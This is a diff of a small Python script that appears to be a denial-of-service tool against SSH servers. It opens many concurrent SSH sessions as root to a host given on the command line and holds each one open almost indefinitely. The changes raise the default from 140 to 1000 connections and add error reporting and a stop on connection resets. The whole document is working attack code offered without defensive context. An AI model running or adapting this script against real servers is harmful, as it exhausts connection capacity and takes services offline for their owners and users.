@@ -7,7 +7,7 @@ import _thread as thread
 
 HOST = argv[1]
 USERNAME = 'root'
-CONCURRENT = 140
+CONCURRENT = 1000
 
 try:
     CONCURRENT = int(argv[2])
@@ -23,9 +23,11 @@ def go():
             s.options_set(options.HOST, HOST)
             s.connect()
             sleep(2147483647)
-        except:
+        except Exception as e:
             global count
-            print('died #' + str(count))
+            print(str(e) + ': died #' + str(count))
+            if 'Connection reset' in str(e):
+                break
             count += 1
             pass
 
@@ -33,5 +35,6 @@ def go():
 if __name__ == "__main__":
     for i in range(CONCURRENT):
         thread.start_new_thread(go, ())
+        #sleep(0.1)
         
     sleep(2147483647)
